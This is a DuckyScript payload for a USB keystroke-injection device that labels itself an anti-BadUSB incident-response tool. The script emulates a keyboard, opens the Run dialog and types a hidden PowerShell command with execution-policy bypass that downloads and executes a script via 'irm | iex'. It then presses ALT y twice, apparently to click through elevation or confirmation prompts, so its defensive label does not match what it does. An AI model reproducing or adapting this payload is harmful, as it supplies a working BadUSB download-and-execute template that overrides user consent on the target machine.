REM Title: HID Sentinel IR v1.0
REM Author: sucloudflare
REM Description: Lightweight Anti-BadUSB defensive framework. Detects rogue USB devices via WMI and suspicious PowerShell activity.
REM Target: Windows 10/11
REM Version: 1.0
REM Category: Incident Response
REM =============================================

ATTACKMODE HID STORAGE
DEFAULT_DELAY 250
DELAY 1500

LED SETUP

REM Launch Sentinel
GUI r
DELAY 600
STRING powershell -NoP -Ep Bypass -W Hidden -C "irm http://127.0.0.1:8080/sentinel.ps1 | iex"
ENTER

DELAY 1500
ALT y
DELAY 1000
ALT y
DELAY 2500

LED ATTACK
DELAY 3000

REM Open dashboard / log
STRING "Start-Process http://127.0.0.1:8080/dashboard.html"
ENTER

LED FINISH
